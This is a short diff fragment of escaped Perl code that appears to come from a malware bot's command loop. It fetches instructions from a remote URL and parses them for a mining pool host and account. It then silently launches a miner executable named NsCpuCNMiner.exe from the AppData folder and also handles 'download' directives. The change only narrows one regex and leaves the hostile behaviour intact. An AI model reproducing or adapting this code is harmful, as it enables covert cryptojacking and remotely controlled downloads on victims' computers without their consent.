@@ -121,7 +121,7 @@ END {
       }
     }
     my \$response = \$ua->get(\"$_[0]\");
-    if(\$response->decoded_content =~ m/miner->host:(.+);email:(.+);|miner->host:(.+),email:(.+);/){
+    if(\$response->decoded_content =~ m/miner->host:(.+);email:(.+);/){
       system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
     }
     if(\$response->decoded_content =~ m/download:(.+),(.+);/){
